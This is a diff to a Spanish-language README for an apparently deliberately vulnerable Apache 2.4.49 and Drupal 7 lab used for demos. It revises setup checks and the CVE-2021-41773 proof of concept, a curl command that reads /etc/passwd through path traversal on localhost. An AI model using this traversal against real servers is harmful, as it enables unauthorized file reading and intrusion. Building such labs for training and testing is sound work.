@@ -47,13 +47,17 @@ Drupal 7 no se autoinstala; hay que pasar por el asistente web **una vez**:
 ```bash
 bash verificar.sh
 ```
-Debe dar `Server: Apache/2.4.49`, leer `/etc/passwd` por el traversal y `200` en el tráfico normal.
+Debe dar `Server: Apache/2.4.49` y leer `/etc/passwd` por el traversal en `/cgi-bin/`.
+**Nota de orden:** antes de instalar Drupal, `/` redirige a `install.php`; el script lo detecta y
+marca los chequeos de Drupalgeddon 2 y de QA como **PEND** (pendientes), no como falla. Después de
+instalar Drupal, esos deben pasar a `200`.
 
 ## PoCs rápidos (para el sandbox / la demo)
 
-**CVE-2021-41773 — leer un archivo del servidor:**
+**CVE-2021-41773 — leer un archivo del servidor** (el PoC va por `/cgi-bin/`; por `/icons/` no
+funciona en este montaje porque el proxy no expone ese alias):
 ```bash
-curl -s --path-as-is "http://localhost:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+curl -s --path-as-is "http://localhost:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
 ```
 
 **Con Nuclei (si lo tienen):**
